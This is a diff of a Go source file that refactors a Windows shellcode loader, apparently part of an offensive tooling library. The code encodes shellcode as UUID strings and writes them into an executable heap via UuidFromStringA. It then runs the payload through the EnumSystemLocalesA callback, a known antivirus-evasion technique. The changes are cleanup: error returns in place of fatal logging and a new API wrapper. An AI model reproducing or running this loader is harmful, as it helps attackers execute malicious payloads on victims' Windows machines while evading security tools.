@@ -4,87 +4,59 @@ import (
 	"bytes"
 	"encoding/binary"
 	"fmt"
-	"unsafe"
-	"variant/log"
-	"variant/wdll"
+	"variant/xwindows"
 
 	"github.com/google/uuid"
+	"golang.org/x/sys/windows"
 )
 
-func UuidFromStringLoad(shellcode []byte) {
+func UUIDFromString(shellcode []byte) error {
 
-	uuids, err := shellcodeToUUID(shellcode)
+	uuids, err := ShellcodeToUUID(shellcode)
 	if err != nil {
-		log.Fatal(err.Error())
+		return fmt.Errorf("error loading UUIDs from shellcode: %w", err)
 	}
-
-	/*
-		https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate
-
-			HANDLE HeapCreate(
-				DWORD  flOptions,
-				SIZE_T dwInitialSize,
-				SIZE_T dwMaximumSize
-			);
-
-		  HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
-	*/
 
 	// Create the heap
 	// HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
-	heapAddr, _, err := wdll.HeapCreate().Call(0x00040000, 0, 0)
+	heapAddr, hcErr := xwindows.HeapCreate(0x00040000, 0, 0)
 	if heapAddr == 0 {
-		log.Fatal(fmt.Sprintf("there was an error calling the HeapCreate function:\r\n%s", err))
-
+		return fmt.Errorf("HeapCreate failed: %w", hcErr)
 	}
 
 	// Allocate the heap
-	addr, _, err := wdll.HeapAlloc().Call(heapAddr, 0, 0x00100000)
+	addr, haErr := xwindows.HeapAlloc(windows.Handle(heapAddr), 0, 0x00100000)
 	if addr == 0 {
-		log.Fatal(fmt.Sprintf("there was an error calling the HeapAlloc function:\r\n%s", err))
+		return fmt.Errorf("HeapAlloc failed: %w", haErr)
 	}
 
-	/*
-		RPC_STATUS UuidFromStringA(
-			RPC_CSTR StringUuid,
-			UUID     *Uuid
-			);
-	*/
-
 	addrPtr := addr
-	for _, uuid := range uuids {
-		// Must be a RPC_CSTR which is null terminated
-		u := append([]byte(uuid), 0)
+	for _, id := range uuids {
+		// Must be an RPC_CSTR which is null terminated
+		u := append([]byte(id), 0)
 
 		// Only need to pass a pointer to the first character in the null-terminated string representation of the UUID
-		rpcStatus, _, err := wdll.UuidFromStringA().Call(uintptr(unsafe.Pointer(&u[0])), addrPtr)
-
+		rpcStatus, _ := xwindows.UuidFromStringA(&u[0], addrPtr)
 		// RPC_S_OK = 0
 		if rpcStatus != 0 {
-			log.Fatal(fmt.Sprintf("There was an error calling UuidFromStringA:\r\n%s", err))
+			return fmt.Errorf("UuidFromStringA failed: %v", rpcStatus)
 		}
 
 		addrPtr += 16
 	}
 
-	/*
-		BOOL EnumSystemLocalesA(
-		LOCALE_ENUMPROCA lpLocaleEnumProc,
-		DWORD            dwFlags
-		);
-	*/
-
 	// Execute Shellcode
-	ret, _, err := wdll.EnumSystemLocalesA().Call(addr, 0)
+	ret, esErr := xwindows.EnumSystemLocalesA(addr, 0)
 	if ret == 0 {
-		log.Fatal(fmt.Sprintf("EnumSystemLocalesA GetLastError: %s", err))
+		return fmt.Errorf("EnumSystemLocalesA failed: %w", esErr)
 	}
+
+	return nil
 }
 
-// shellcodeToUUID takes in shellcode bytes, pads it to 16 bytes, breaks them into 16 byte chunks (size of a UUID),
-// converts the first 8 bytes into Little Endian format, creates a UUID from the bytes, and returns an array of UUIDs
-func shellcodeToUUID(shellcode []byte) ([]string, error) {
-
+// ShellcodeToUUID takes in shellcode bytes, pads it to 16 bytes, breaks them into 16 byte chunks (size of a UUID),
+// converts the first eight bytes into Little Endian format, creates a UUID from the bytes, and returns an array of UUIDs
+func ShellcodeToUUID(shellcode []byte) ([]string, error) {
 	// Pad shellcode to 16 bytes, the size of a UUID
 	if 16-len(shellcode)%16 < 16 {
 		pad := bytes.Repeat([]byte{byte(0x90)}, 16-len(shellcode)%16)
@@ -96,7 +68,7 @@ func shellcodeToUUID(shellcode []byte) ([]string, error) {
 	for i := 0; i < len(shellcode); i += 16 {
 		var uuidBytes []byte
 
-		// This seems unecessary or overcomplicated way to do this
+		// This seems an unnecessary or overcomplicated way to do this
 
 		// Add first 4 bytes
 		buf := make([]byte, 4)
